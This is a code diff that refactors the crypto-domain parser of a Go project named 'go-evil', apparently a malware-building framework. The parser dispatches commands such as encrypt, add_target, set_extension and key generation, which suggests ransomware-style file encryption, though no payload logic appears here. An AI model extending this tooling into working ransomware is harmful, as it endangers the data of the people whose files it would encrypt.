@@ -8,45 +8,45 @@ import (
 	"github.com/TeamPhoneix/go-evil/domains/crypto/encrypt"
 	"github.com/TeamPhoneix/go-evil/domains/crypto/generate"
 	"github.com/TeamPhoneix/go-evil/domains/crypto/target"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
-// The main parser for the crypto domain
-func Parser(function string, value string, s_json string) ([]string, string) {
+func Parser(function string, value string, data_object *json.Json_t) []string {
 	call := []string{}
 
 	switch function {
 	case "encrypt":
-		call, s_json = encrypt.Encrypt(value, s_json)
+		call = encrypt.Encrypt(value, data_object)
 
 	case "set_method":
-		call, s_json = configuration.Set_crypto(value, s_json)
+		call = configuration.Set_crypto(value, data_object)
 
 	case "set_aes_key":
-		call, s_json = configuration.Set_aes_key(value, s_json)
+		call = configuration.Set_aes_key(value, data_object)
 
 	case "generate_aes_key":
-		call, s_json = generate.AES_key(value, s_json)
+		call = generate.AES_key(value, data_object)
 
 	case "generate_rsa_key":
-		call, s_json = generate.RSA_key(value, s_json)
+		call = generate.RSA_key(value, data_object)
 
 	case "add_target":
-		call, s_json = target.Add(value, s_json)
+		call = target.Add(value, data_object)
 
 	case "set_extension":
-		call, s_json = configuration.Set_extension(value, s_json)
+		call = configuration.Set_extension(value, data_object)
 
 	case "decrypt":
-		call, s_json = decrypt.Decrypt(value, s_json)
+		call = decrypt.Decrypt(value, data_object)
 
 	case "clean_targets":
-		call, s_json = target.Clean(value, s_json)
+		call = target.Clean(value, data_object)
 
 	default:
 		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "crypto.Parser()")
 
 	}
 
-	return call, s_json
+	return call
 }
